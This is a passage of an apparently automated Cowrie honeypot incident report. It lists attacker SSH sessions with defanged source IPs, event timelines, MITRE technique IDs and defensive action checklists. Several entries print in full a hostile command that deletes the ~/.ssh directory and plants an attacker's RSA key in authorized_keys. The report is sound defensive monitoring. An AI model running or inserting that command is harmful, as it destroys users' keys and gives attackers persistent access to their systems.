| `2026-07-02 02:57:33` | `cowrie.client.version` |
| `2026-07-02 02:57:33` | `cowrie.client.kex` |
| `2026-07-02 02:57:33` | `cowrie.login.success` |
| `2026-07-02 02:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.57[.]206` to AbuseIPDB if not already reported
- [ ] Block `209.145.57[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377aeea706c6

| Field | Detail |
|---|---|
| **Source IP** | `209.145.57[.]206` |
| **First Seen** | 2026-07-02 02:57 |
| **Last Seen** | 2026-07-02 02:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:57:33` | `cowrie.session.connect` |
| `2026-07-02 02:57:33` | `cowrie.client.version` |
| `2026-07-02 02:57:34` | `cowrie.client.kex` |
| `2026-07-02 02:57:34` | `cowrie.login.success` |
| `2026-07-02 02:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.57[.]206` to AbuseIPDB if not already reported
- [ ] Block `209.145.57[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2fcc5cd62c0

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-07-02 02:58 |
| **Last Seen** | 2026-07-02 02:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:58:34` | `cowrie.session.connect` |
| `2026-07-02 02:58:34` | `cowrie.client.version` |
| `2026-07-02 02:58:34` | `cowrie.client.kex` |
| `2026-07-02 02:58:35` | `cowrie.login.success` |
| `2026-07-02 02:58:36` | `cowrie.session.params` |
| `2026-07-02 02:58:36` | `cowrie.command.input` |
| `2026-07-02 02:58:36` | `cowrie.command.failed` |
| `2026-07-02 02:58:37` | `cowrie.log.closed` |
| `2026-07-02 02:58:37` | `cowrie.session.params` |
| `2026-07-02 02:58:37` | `cowrie.command.input` |
| `2026-07-02 02:58:38` | `cowrie.session.file_download` |
| `2026-07-02 02:58:38` | `cowrie.log.closed` |
| `2026-07-02 02:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465a630f832b

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-07-02 02:58 |
| **Last Seen** | 2026-07-02 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:58:38` | `cowrie.session.connect` |
| `2026-07-02 02:58:38` | `cowrie.client.version` |
| `2026-07-02 02:58:38` | `cowrie.client.kex` |
| `2026-07-02 02:58:39` | `cowrie.login.success` |
| `2026-07-02 02:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2de53401e6c

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-07-02 02:58 |
| **Last Seen** | 2026-07-02 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:58:39` | `cowrie.session.connect` |
| `2026-07-02 02:58:39` | `cowrie.client.version` |
| `2026-07-02 02:58:40` | `cowrie.client.kex` |
| `2026-07-02 02:58:40` | `cowrie.login.success` |
| `2026-07-02 02:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db37083c7e0e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 03:04 |
| **Last Seen** | 2026-07-02 03:05 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:04:46` | `cowrie.session.connect` |
| `2026-07-02 03:04:48` | `cowrie.client.version` |
| `2026-07-02 03:04:48` | `cowrie.client.kex` |
| `2026-07-02 03:04:55` | `cowrie.login.success` |
| `2026-07-02 03:04:58` | `cowrie.session.params` |
| `2026-07-02 03:04:58` | `cowrie.command.input` |
| `2026-07-02 03:05:00` | `cowrie.log.closed` |
| `2026-07-02 03:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52464b58524d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 03:07 |
| **Last Seen** | 2026-07-02 03:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:07:52` | `cowrie.session.connect` |
| `2026-07-02 03:07:53` | `cowrie.client.version` |
| `2026-07-02 03:07:53` | `cowrie.client.kex` |
| `2026-07-02 03:07:54` | `cowrie.login.success` |
| `2026-07-02 03:07:55` | `cowrie.session.params` |
| `2026-07-02 03:07:55` | `cowrie.command.input` |
| `2026-07-02 03:07:56` | `cowrie.log.closed` |
| `2026-07-02 03:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7cec16e7e4

| Field | Detail |
|---|---|
| **Source IP** | `34.79.21[.]94` |
| **First Seen** | 2026-07-02 03:12 |
| **Last Seen** | 2026-07-02 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:12:11` | `cowrie.session.connect` |
| `2026-07-02 03:12:11` | `cowrie.client.version` |
| `2026-07-02 03:12:11` | `cowrie.client.kex` |
| `2026-07-02 03:12:13` | `cowrie.login.success` |
| `2026-07-02 03:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.21[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.79.21[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c24e701983c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 03:16 |
| **Last Seen** | 2026-07-02 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:16:24` | `cowrie.session.connect` |
| `2026-07-02 03:16:24` | `cowrie.client.version` |
| `2026-07-02 03:16:24` | `cowrie.client.kex` |
| `2026-07-02 03:16:25` | `cowrie.login.success` |
| `2026-07-02 03:16:25` | `cowrie.session.params` |
| `2026-07-02 03:16:25` | `cowrie.command.input` |
| `2026-07-02 03:16:25` | `cowrie.log.closed` |
| `2026-07-02 03:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51e008a854b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:16 |
| **Last Seen** | 2026-07-02 03:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:16:31` | `cowrie.session.connect` |
| `2026-07-02 03:16:31` | `cowrie.client.version` |
| `2026-07-02 03:16:31` | `cowrie.client.kex` |
| `2026-07-02 03:16:34` | `cowrie.login.success` |
| `2026-07-02 03:16:39` | `cowrie.session.params` |
| `2026-07-02 03:16:39` | `cowrie.command.input` |
| `2026-07-02 03:16:39` | `cowrie.log.closed` |
| `2026-07-02 03:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b119917040

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 03:17 |
| **Last Seen** | 2026-07-02 03:17 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:17:18` | `cowrie.session.connect` |
| `2026-07-02 03:17:19` | `cowrie.client.version` |
| `2026-07-02 03:17:19` | `cowrie.client.kex` |
| `2026-07-02 03:17:28` | `cowrie.login.success` |
| `2026-07-02 03:17:32` | `cowrie.session.params` |
| `2026-07-02 03:17:32` | `cowrie.command.input` |
| `2026-07-02 03:17:38` | `cowrie.log.closed` |
| `2026-07-02 03:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65101637041a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:19 |
| **Last Seen** | 2026-07-02 03:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:19:11` | `cowrie.session.connect` |
| `2026-07-02 03:19:12` | `cowrie.client.version` |
| `2026-07-02 03:19:12` | `cowrie.client.kex` |
| `2026-07-02 03:19:16` | `cowrie.login.success` |
| `2026-07-02 03:19:21` | `cowrie.session.params` |
| `2026-07-02 03:19:21` | `cowrie.command.input` |
| `2026-07-02 03:19:22` | `cowrie.log.closed` |
| `2026-07-02 03:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff7ae9574a5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 03:21 |
| **Last Seen** | 2026-07-02 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:21:51` | `cowrie.session.connect` |
| `2026-07-02 03:21:51` | `cowrie.client.version` |
| `2026-07-02 03:21:51` | `cowrie.client.kex` |
| `2026-07-02 03:21:53` | `cowrie.login.success` |
| `2026-07-02 03:21:54` | `cowrie.session.params` |
| `2026-07-02 03:21:54` | `cowrie.command.input` |
| `2026-07-02 03:21:54` | `cowrie.log.closed` |
| `2026-07-02 03:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a668387618df

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:21 |
| **Last Seen** | 2026-07-02 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:21:51` | `cowrie.session.connect` |
| `2026-07-02 03:21:52` | `cowrie.client.version` |
| `2026-07-02 03:21:52` | `cowrie.client.kex` |
| `2026-07-02 03:21:54` | `cowrie.login.success` |
| `2026-07-02 03:21:59` | `cowrie.session.params` |
| `2026-07-02 03:21:59` | `cowrie.command.input` |
| `2026-07-02 03:22:00` | `cowrie.log.closed` |
| `2026-07-02 03:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2da212f2d88

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:24 |
| **Last Seen** | 2026-07-02 03:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:24:25` | `cowrie.session.connect` |
| `2026-07-02 03:24:25` | `cowrie.client.version` |
| `2026-07-02 03:24:25` | `cowrie.client.kex` |
| `2026-07-02 03:24:28` | `cowrie.login.success` |
| `2026-07-02 03:24:33` | `cowrie.session.params` |
| `2026-07-02 03:24:34` | `cowrie.command.input` |
| `2026-07-02 03:24:34` | `cowrie.log.closed` |
| `2026-07-02 03:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329812f4681a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:27 |
| **Last Seen** | 2026-07-02 03:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:27:00` | `cowrie.session.connect` |
| `2026-07-02 03:27:00` | `cowrie.client.version` |
| `2026-07-02 03:27:00` | `cowrie.client.kex` |
| `2026-07-02 03:27:03` | `cowrie.login.success` |
| `2026-07-02 03:27:06` | `cowrie.session.params` |
| `2026-07-02 03:27:06` | `cowrie.command.input` |
| `2026-07-02 03:27:06` | `cowrie.log.closed` |
| `2026-07-02 03:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf33514bd24

| Field | Detail |
|---|---|
| **Source IP** | `150.5.131[.]119` |
| **First Seen** | 2026-07-02 03:28 |
| **Last Seen** | 2026-07-02 03:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:28:12` | `cowrie.session.connect` |
| `2026-07-02 03:28:12` | `cowrie.client.version` |
| `2026-07-02 03:28:12` | `cowrie.client.kex` |
| `2026-07-02 03:28:13` | `cowrie.login.success` |
| `2026-07-02 03:28:14` | `cowrie.session.params` |
| `2026-07-02 03:28:14` | `cowrie.command.input` |
| `2026-07-02 03:28:14` | `cowrie.command.failed` |
| `2026-07-02 03:28:15` | `cowrie.log.closed` |
| `2026-07-02 03:28:15` | `cowrie.session.params` |
| `2026-07-02 03:28:15` | `cowrie.command.input` |
| `2026-07-02 03:28:16` | `cowrie.session.file_download` |
| `2026-07-02 03:28:16` | `cowrie.log.closed` |
| `2026-07-02 03:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.131[.]119` to AbuseIPDB if not already reported
- [ ] Block `150.5.131[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae38018db36

| Field | Detail |
|---|---|
| **Source IP** | `150.5.131[.]119` |
| **First Seen** | 2026-07-02 03:28 |
| **Last Seen** | 2026-07-02 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:28:16` | `cowrie.session.connect` |
| `2026-07-02 03:28:16` | `cowrie.client.version` |
| `2026-07-02 03:28:16` | `cowrie.client.kex` |
| `2026-07-02 03:28:17` | `cowrie.login.success` |
| `2026-07-02 03:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.131[.]119` to AbuseIPDB if not already reported
- [ ] Block `150.5.131[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8eda312c66

| Field | Detail |
|---|---|
| **Source IP** | `150.5.131[.]119` |
| **First Seen** | 2026-07-02 03:28 |
| **Last Seen** | 2026-07-02 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:28:17` | `cowrie.session.connect` |
| `2026-07-02 03:28:17` | `cowrie.client.version` |
| `2026-07-02 03:28:18` | `cowrie.client.kex` |
| `2026-07-02 03:28:19` | `cowrie.login.success` |
| `2026-07-02 03:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.131[.]119` to AbuseIPDB if not already reported
- [ ] Block `150.5.131[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4762deee0f1d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:29 |
| **Last Seen** | 2026-07-02 03:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:29:26` | `cowrie.session.connect` |
| `2026-07-02 03:29:27` | `cowrie.client.version` |
| `2026-07-02 03:29:27` | `cowrie.client.kex` |
| `2026-07-02 03:29:28` | `cowrie.login.success` |
| `2026-07-02 03:29:31` | `cowrie.session.params` |
| `2026-07-02 03:29:31` | `cowrie.command.input` |
| `2026-07-02 03:29:32` | `cowrie.log.closed` |
| `2026-07-02 03:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4feae7132369

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 03:29 |
| **Last Seen** | 2026-07-02 03:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:29:49` | `cowrie.session.connect` |
| `2026-07-02 03:29:51` | `cowrie.client.version` |
| `2026-07-02 03:29:51` | `cowrie.client.kex` |
| `2026-07-02 03:29:57` | `cowrie.login.success` |
| `2026-07-02 03:30:01` | `cowrie.session.params` |
| `2026-07-02 03:30:01` | `cowrie.command.input` |
| `2026-07-02 03:30:03` | `cowrie.log.closed` |
| `2026-07-02 03:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c2c1668a1a

| Field | Detail |
|---|---|
| **Source IP** | `117.20.119[.]70` |
| **First Seen** | 2026-07-02 03:32 |
| **Last Seen** | 2026-07-02 03:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:32:21` | `cowrie.session.connect` |
| `2026-07-02 03:32:21` | `cowrie.client.version` |
| `2026-07-02 03:32:21` | `cowrie.client.kex` |
| `2026-07-02 03:32:22` | `cowrie.login.success` |
| `2026-07-02 03:32:23` | `cowrie.session.params` |
| `2026-07-02 03:32:23` | `cowrie.command.input` |
| `2026-07-02 03:32:23` | `cowrie.command.failed` |
| `2026-07-02 03:32:24` | `cowrie.log.closed` |
| `2026-07-02 03:32:25` | `cowrie.session.params` |
| `2026-07-02 03:32:25` | `cowrie.command.input` |
| `2026-07-02 03:32:25` | `cowrie.session.file_download` |
| `2026-07-02 03:32:25` | `cowrie.log.closed` |
| `2026-07-02 03:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.20.119[.]70` to AbuseIPDB if not already reported
- [ ] Block `117.20.119[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec787fda68f

| Field | Detail |
|---|---|
| **Source IP** | `117.20.119[.]70` |
| **First Seen** | 2026-07-02 03:32 |
| **Last Seen** | 2026-07-02 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:32:26` | `cowrie.session.connect` |
| `2026-07-02 03:32:26` | `cowrie.client.version` |
| `2026-07-02 03:32:26` | `cowrie.client.kex` |
| `2026-07-02 03:32:27` | `cowrie.login.success` |
| `2026-07-02 03:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.20.119[.]70` to AbuseIPDB if not already reported
- [ ] Block `117.20.119[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6678b8a709ed

| Field | Detail |
|---|---|
| **Source IP** | `117.20.119[.]70` |
| **First Seen** | 2026-07-02 03:32 |
| **Last Seen** | 2026-07-02 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:32:28` | `cowrie.session.connect` |
| `2026-07-02 03:32:28` | `cowrie.client.version` |
| `2026-07-02 03:32:28` | `cowrie.client.kex` |
| `2026-07-02 03:32:29` | `cowrie.login.success` |
| `2026-07-02 03:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.20.119[.]70` to AbuseIPDB if not already reported
- [ ] Block `117.20.119[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd1d2034889

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:34 |
| **Last Seen** | 2026-07-02 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:34:22` | `cowrie.session.connect` |
| `2026-07-02 03:34:22` | `cowrie.client.version` |
